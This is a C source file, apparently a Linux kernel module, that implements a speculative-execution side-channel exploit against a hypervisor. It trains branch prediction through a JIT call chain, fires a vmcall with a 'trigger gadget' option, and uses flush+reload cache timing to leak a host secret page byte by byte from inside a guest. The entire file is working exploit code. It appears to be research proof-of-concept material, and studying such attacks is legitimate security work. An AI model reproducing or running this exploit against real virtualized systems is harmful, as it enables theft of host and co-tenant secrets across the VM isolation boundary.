#include<linux/kernel.h>
#include <linux/mm.h>

#include "lib.h"
#include "leak.h"

typedef void (*entry_t)(void * arg1, void * arg2, void * arg3, void * arg4,
						void * arg5, void * arg6);

static uint64_t do_flush_and_reload(struct config * cfg) {

	uint64_t ret_value;
	uint64_t t;
	uint64_t hits = 0;
	int k;

	for (size_t i = 0; i < 1; i++)
	{

		// evict and/or create contention
		k = 0;
		while (cfg->evict_list[k]) {
			((entry_t) cfg->enter_jit_chain)(cfg->evict_list[k], 0, 0, cfg->fr_buf_p, 0, 0);
			((entry_t) cfg->enter_jit_chain)(cfg->evict_list[k], 0, 0, cfg->fr_buf_p, 0, 0);
			k++;
		}


		// TRAIN
		((entry_t) cfg->enter_jit_chain)(cfg->caller0, 0, 0, cfg->fr_buf_p, 0, 0);

		flush(cfg->fr_buf);

		sfence();

		// Execute VICTIM (VMM)

		asm volatile(
			"vmcall\n"
			: "=a" (ret_value)
			: "a" (13), "b" (0), "c" (OPTION_TRIGGER_GADGET), "d" (cfg->host_arg_secret), "S" (cfg->host_arg_fr_buf)
			:
		);

		if(ret_value != 1) {
			pr_info("VMM CALL FAILED!\n");
			return -1;
		}

		t = load_time(cfg->fr_buf);
		if(t < THR) {
			return 1;
		}


	}

	return hits;


}

int leak_byte_forwards(struct config * cfg, uint64_t prefix) {

    uint64_t fr_offset;
    uint64_t hits;

    for (size_t outer = 0; outer < 10; outer++)
    {
        for (uint64_t byte = 0x0; byte <= 0xff; byte++) {


            fr_offset = (byte << 56);

            cfg->host_arg_fr_buf = cfg->host_fr_buf - fr_offset - prefix;

            hits = do_flush_and_reload(cfg);

            if (hits > 0) {
                return (int) byte;
            }
        }

    }

    return -1;

}

#define LEAK_RATE_TEST_SIZE 0x1000

int leak_page(struct config * cfg) {
	uint64_t prefix;
	int found;

	uint8_t * cur_byte = cfg->leaked_bytes + 7;
    cfg->host_arg_secret = cfg->host_secret_page;

	size_t total_iter = 0;


	for (size_t i = 0; i < LEAK_RATE_TEST_SIZE - 7; i++)
	{
		prefix = *(uint64_t *) (cfg->secret_page + i);

		prefix = prefix & ((1LU << 56) - 1);

		found = leak_byte_forwards(cfg, prefix);

		size_t iter = 0;
		while (found == -1 ) {
			found = leak_byte_forwards(cfg, prefix);

			iter++;
			if (iter == 1000) {
				pr_info("Stuck at %px, aborting...\n", cfg->host_arg_secret);
				return 1;
			}
		}

		total_iter += iter;


		*cur_byte = found;
		cur_byte += 1;
		cfg->host_arg_secret += 1;

	}

	return 0;

}
